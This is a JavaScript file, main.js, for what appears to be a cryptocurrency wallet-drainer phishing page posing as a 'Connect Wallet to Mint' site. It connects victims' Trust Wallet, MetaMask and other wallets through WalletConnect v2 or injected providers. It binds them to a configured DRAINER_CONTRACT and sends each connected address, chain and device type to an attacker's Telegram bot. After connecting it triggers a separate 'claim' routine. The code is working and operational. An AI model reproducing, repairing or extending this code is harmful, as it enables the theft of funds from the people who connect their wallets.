// main.js — Trust Wallet + WalletConnect v2 fixed build
// Uses EthereumProvider EXCLUSIVELY for the entire connect lifecycle.
// SignClient is loaded ONLY for low-level session inspection, never for pairing.

import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  // WalletConnect projectId — must be valid. If this is wrong, nothing works.
  const WC_PROJECT_ID = PROJECT_ID;

  // Relay URLs — try primary, fall back to org if the main relay is blocked.
  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice    = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice= /Android/i.test(UA);
  const isDesktopDevice= !isMobileDevice;

  function getPlatform() {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))  return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))        return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                     return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                          return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  //  Only EthereumProvider and the Modal are strictly required. SignClient
  //  is loaded for low-level session introspection only — never for pairing.
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const signCdn = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];

    const [EthereumProvider, WalletConnectModal, SignClient] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m, 'Modal'),
      tryImport(signCdn,     (m) => m.default || m, 'SignClient').catch(() => null),
    ]);

    return { EthereumProvider, WalletConnectModal, SignClient };
  }

  // ==========================================================================
  //  RELAY PROBE
  // ==========================================================================
  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch {}
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;
  let WalletConnectModal = null;
  let SignClient = null;

  let wcProvider = null;         // The single source of truth for WC
  let wcModal = null;            // Modal instance
  let injectedProvider = null;   // Injected (EIP-1193) if available
  let activeProvider = null;     // Whichever is currently in use
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let currentAddress = null;
  let currentChain = 'evm';
  let wcInitPromise = null;      // Cache the WC provider init

  // ==========================================================================
  //  UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, chainType = 'evm') {
    localStorage.setItem('connectedWallet', address);
    localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('chainType');
  }

  // ==========================================================================
  //  PUBLISH GLOBAL STATE (what script.js consumes)
  // ==========================================================================
  function publishGlobalState(address, chain, provider) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      publishedAt: Date.now(),
    };
    logDebug(`published global: addr=${address} chain=${chain} hasWeb3=${!!web3Instance} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    currentAddress = address;
    currentChain = chain;

    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain, activeProvider);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    currentAddress = null;
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 (desktop injected discovery)
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;
  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER (desktop, multiple injected)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon; i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT PROVIDER — SINGLE SOURCE OF TRUTH
  //  No SignClient pairing. EthereumProvider.init() does everything.
  //  Cache the instance so repeated calls reuse the same connection.
  // ==========================================================================
  async function getWalletConnectProvider() {
    if (wcProvider) return wcProvider;
    if (wcInitPromise) return wcInitPromise;

    wcInitPromise = (async () => {
      const relayUrl = await pickRelayUrl();

      logDebug(`WC init: projectId=${WC_PROJECT_ID.slice(0, 8)}… relay=${relayUrl}`);
      const t0 = performance.now();

      const provider = await withTimeout(
        EthereumProvider.init({
          projectId: WC_PROJECT_ID,
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          showQrModal: false,               // We use our own modal
          metadata: DAPP_METADATA,
          relayUrl,
          // Disable WC's own QR modal since we render our own
          qrModalOptions: { themeMode: 'dark' },
        }),
        isMobileDevice ? 20000 : 12000,
        'WC provider init'
      );

      logDebug(`✅ WC provider init OK in ${(performance.now() - t0).toFixed(0)}ms`);
      wcProvider = provider;

      // Attach events ONCE. Events fire throughout the WC provider's life.
      attachWcProviderEvents(provider);

      return provider;
    })();

    try {
      return await wcInitPromise;
    } catch (e) {
      wcInitPromise = null;
      wcProvider = null;
      throw e;
    }
  }

  // ==========================================================================
  //  WC PROVIDER EVENTS
  // ==========================================================================
  function attachWcProviderEvents(provider) {
    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        handleAddressConnected(accounts[0]);
      }
    });

    provider.on('chainChanged', (chainId) => {
      logDebug(`WC chainChanged: ${chainId}`);
      showStatus(`Network changed to ${chainId}`, 'info');
      if (currentAddress && web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(currentAddress, 'evm', provider);
        } catch {}
      }
    });

    provider.on('disconnect', () => {
      logDebug('WC disconnect event');
      resetConnectedUI();
      clearSavedWallet();
      wcProvider = null;
      wcInitPromise = null;
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      resetConnectedUI();
      clearSavedWallet();
      wcProvider = null;
      wcInitPromise = null;
    });

    provider.on('connect', (info) => {
      logDebug(`WC connect event: ${JSON.stringify(info)}`);
    });
  }

  // ==========================================================================
  //  CONNECT — VIA WALLETCONNECT
  // ==========================================================================
  async function connectViaWalletConnect() {
    if (isConnecting) return false;
    isConnecting = true;

    try {
      showStatus('Preparing wallet connection...', 'info');

      // Step 1: get (or create) the WC provider. This opens the relay.
      const provider = await getWalletConnectProvider();
      activeProvider = provider;

      // Step 2: if provider already has accounts, we are connected.
      if (provider.accounts && provider.accounts.length > 0) {
        logDebug(`WC already has accounts: ${provider.accounts[0]}`);
        await finalizeConnection(provider.accounts[0], provider);
        isConnecting = false;
        return true;
      }

      // Step 3: trigger the pairing flow. This generates a URI and — because
      //         showQrModal is false — emits a display_uri event we can
      //         feed to our own modal.
      showStatus('Choose your wallet', 'info');

      // Listen for display_uri BEFORE calling connect()
      const uriPromise = new Promise((resolve) => {
        const handler = (uri) => {
          logDebug(`WC display_uri: ${uri.slice(0, 40)}…`);
          resolve(uri);
        };
        provider.once ? provider.once('display_uri', handler) : provider.on('display_uri', handler);
      });

      // Race: either connect() resolves with the session, or we get the URI
      // and open the modal. Trust Wallet often returns the URI first.
      const connectPromise = provider.connect({
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        // Requesting these methods matters — Trust Wallet filters by them.
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
        events: ['chainChanged', 'accountsChanged'],
      }).then(() => 'connected').catch((e) => {
        logDebug(`WC connect() rejected: ${e.message}`);
        return 'error';
      });

      // Open the modal as soon as we have the URI.
      uriPromise.then((uri) => {
        if (!uri) return;
        if (wcModal) {
          wcModal.openModal({ uri });
        } else {
          logDebug('⚠️ No modal available — falling back to WC default QR');
          // If the modal failed to load, wallet still works via WC deeplink.
        }
        sessionStorage.setItem('pending_wc_uri', uri);
      }).catch((e) => logDebug(`uriPromise: ${e.message}`));

      // Wait for connect() to resolve — 5 minutes is generous for mobile.
      const result = await withTimeout(
        connectPromise,
        300000,
        'WC connect'
      );

      if (result === 'error') {
        isConnecting = false;
        return false;
      }

      // Step 4: fetch the accounts. On Trust Wallet, this sometimes arrives
      //         a moment AFTER connect() resolves, so we poll briefly.
      let accounts = provider.accounts || [];
      if (!accounts.length) {
        for (let i = 0; i < 10; i++) {
          await new Promise((r) => setTimeout(r, 300));
          accounts = provider.accounts || [];
          if (accounts.length) break;
        }
      }

      if (!accounts.length) {
        // Some wallets only respond to eth_accounts — try that too.
        try {
          accounts = await withTimeout(
            provider.request({ method: 'eth_accounts' }),
            5000,
            'eth_accounts'
          );
        } catch (e) {
          logDebug(`eth_accounts failed: ${e.message}`);
        }
      }

      if (!accounts || !accounts.length) {
        logDebug('❌ WC connect: no accounts after approval');
        showStatus('Wallet approved but no account returned. Retrying...', 'error');
        isConnecting = false;
        return false;
      }

      if (wcModal) { try { wcModal.closeModal(); } catch {} }
      sessionStorage.removeItem('pending_wc_uri');

      await finalizeConnection(accounts[0], provider);
      isConnecting = false;
      return true;

    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      if (wcModal) { try { wcModal.closeModal(); } catch {} }
      sessionStorage.removeItem('pending_wc_uri');
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  FINALIZE CONNECTION (shared between WC and injected)
  // ==========================================================================
  async function finalizeConnection(address, provider) {
    activeProvider = provider;

    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(provider);
    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

    saveWallet(address, 'evm');
    updateConnectedUI(address, 'evm');

    logDebug(`✅ Connection finalised: ${address}`);
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return false;

      injectedProvider = provider;
      attachInjectedEvents(provider);
      await finalizeConnection(accounts[0], provider);

      logDebug(`✅ Injected connected: ${accounts[0]} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  function attachInjectedEvents(provider) {
    if (!provider || !provider.on) return;
    if (provider.__apexAttached) return;
    provider.__apexAttached = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        handleAddressConnected(accounts[0]);
      }
    });
    provider.on('chainChanged', () => {
      if (currentAddress && web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(currentAddress, 'evm', provider);
        } catch {}
      }
    });
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  HANDLE ADDRESS CHANGED
  // ==========================================================================
  async function handleAddressConnected(address) {
    saveWallet(address, 'evm');
    updateConnectedUI(address, 'evm');
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1000);
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider && wcProvider.disconnect) {
        await wcProvider.disconnect();
      }
      if (injectedProvider && injectedProvider.request) {
        // Injected wallets don't have a standard disconnect — just drop ref.
      }
    } catch (e) {
      logDebug(`Disconnect error (non-fatal): ${e.message}`);
    }
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    wcProvider = null;
    wcInitPromise = null;
    injectedProvider = null;
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isDesktopDevice) {
      // Desktop: injected first (fast, no modal).
      success = await connectDirectEVM(8000);
      // If no injected, use WalletConnect.
      if (!success) success = await connectViaWalletConnect();
    } else {
      // Mobile: in-wallet browser if strongly detected.
      const inWallet = detectInWalletBrowser();
      const strongInWallet = inWallet && inWallet.wallet !== 'injected';

      if (strongInWallet) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        success = await connectDirectEVM(8000);
      }
      // Otherwise (or if in-wallet failed), use WalletConnect.
      if (!success) success = await connectViaWalletConnect();
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('Connection failed. Please try again.', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (currentAddress) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  WC's EthereumProvider persists its own session in localStorage. On
  //  reload, calling init() restores it automatically.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();
    if (!savedWallet || savedChain !== 'evm') return;

    // Try WC restore first (works on mobile and desktop).
    try {
      const provider = await getWalletConnectProvider();
      let accounts = provider.accounts || [];
      if (!accounts.length) {
        // Ask via RPC — the provider may still be rebinding.
        try {
          accounts = await withTimeout(provider.request({ method: 'eth_accounts' }), 4000, 'eth_accounts');
        } catch {}
      }
      if (accounts && accounts.length) {
        await finalizeConnection(accounts[0], provider);
        logDebug('♻️ WC session restored');
        return;
      }
    } catch (e) {
      logDebug('WC restore failed: ' + e.message);
    }

    // Fallback: injected restore on desktop.
    if (isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          injectedProvider = window.ethereum;
          attachInjectedEvents(window.ethereum);
          await finalizeConnection(accounts[0], window.ethereum);
          logDebug('♻️ Injected session restored');
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadLibraries();
    EthereumProvider   = libs.EthereumProvider;
    WalletConnectModal = libs.WalletConnectModal;
    SignClient         = libs.SignClient;

    if (!EthereumProvider) throw new Error('EthereumProvider failed to load');
    if (!WalletConnectModal) throw new Error('WalletConnectModal failed to load');

    logDebug('✅ Libraries loaded');

    // Instantiate modal — the WC provider will trigger display_uri, we open this.
    wcModal = new WalletConnectModal({
      projectId: WC_PROJECT_ID,
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index': '9999',
        '--wcm-accent-color': '#FF6B00',
        '--wcm-background-color': '#1F2937',
      },
      enableExplorer: true,
    });

    setupEIP6963();

    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  if (window.ethereum && isDesktopDevice) {
    attachInjectedEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    if (wcModal) { try { wcModal.closeModal(); } catch {} }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
